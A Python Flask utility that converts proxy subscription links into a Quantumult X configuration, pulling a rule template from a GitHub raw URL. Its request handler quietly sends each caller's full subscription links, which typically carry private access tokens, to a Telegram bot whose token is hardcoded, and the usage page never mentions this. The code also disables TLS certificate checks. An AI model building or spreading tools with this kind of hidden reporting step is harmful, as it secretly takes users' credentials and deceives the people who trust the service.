# coding=utf-8
import sys
from flask import Flask
import flask_restful
import  base64
import  re
import  requests
import urllib3
import json
import time
urllib3.disable_warnings()

def Retry_request(url): #远程下载
    i = 0
    for i in range(3):
        try:
            header = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36'}
            res = requests.get(url, headers=header, timeout=5, verify=False) # verify =false 防止请求时因为代理导致证书不安全
            if res.headers['Connection']!='close':
                flag=False
                return res.text
        except Exception as e:
            i = i +1
            print('重新下载：'+url)

def getqxrules(subs,tags):             # 自定义规则
    
    try:
        rule = Retry_request('https://raw.githubusercontent.com/lzdnico/SSRClash/master/qxconfig')        #请求规则_神机规则
        rules = str(rule).split('下方粘贴你的订阅链接')
        for i in range(len(subs)):
            rules[0] += '\n' + subs[i] + ', tag=' +  tags[i] + ', enabled=true'
        return rules[0] + rules[1]
        
    except Exception as e:
        print(e)

app = Flask(__name__)

@app.route('/')
def my():
    return 'qx api 使用：<br/>调用地址为：http://ip:2333/订阅地址@tag。其中订阅地址中的/替换为!，tag为标签<br/>'\
            '将调用地址复制到qx——配置文件——下载。<br/>'\
            '保存后，长按策略图标，给健康检测添加节点。将最优的节点排在前面。<br/>'


#http://ip:2333/机场1@机场1标签@@机场2@机场2标签@@机场3@机场3标签
#订阅地址中的/替换为！
#@@分割机场         
#机场标签可以不填，如果不填默认值为傻吊家的

@app.route('/<name>',methods=['GET'])
def get(name):
    subs = []
    tags = []
    name = name.replace('!','/')
    links = name.split('@@')
    requests.post('https://api.telegram.org/bot976092923:AAFqWi5Z6XqDffkdxDc7gqyDDMg12ufXFW8/sendMessage?chat_id=447216258&text={text}'.format(text='有人调用了你的QXAPI : \n'+name))

    for link in links:
        subs.append(link.split('@')[0])
        try:
            tags.append(link.split('@')[1])
        except Exception as e:
            tags.append('傻吊家的节点')    
    return getqxrules(subs,tags)
    
if __name__ == '__main__':
    app.run(host='0.0.0.0',debug=False,port=2333)